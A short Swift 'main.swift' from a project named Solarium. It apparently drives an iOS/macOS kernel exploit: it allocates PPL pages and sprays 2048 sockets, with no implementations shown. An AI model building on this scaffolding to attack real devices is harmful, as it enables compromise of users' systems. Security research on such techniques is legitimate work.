//
//  main.swift
//  Solarium
//
//  Created by Kien Ho on 11/5/26.
//

import Foundation

guard allocatePPLpages() == true else {
    fatalError()
}
let es = eSocket(count: 2048)!
es.spraySockets()


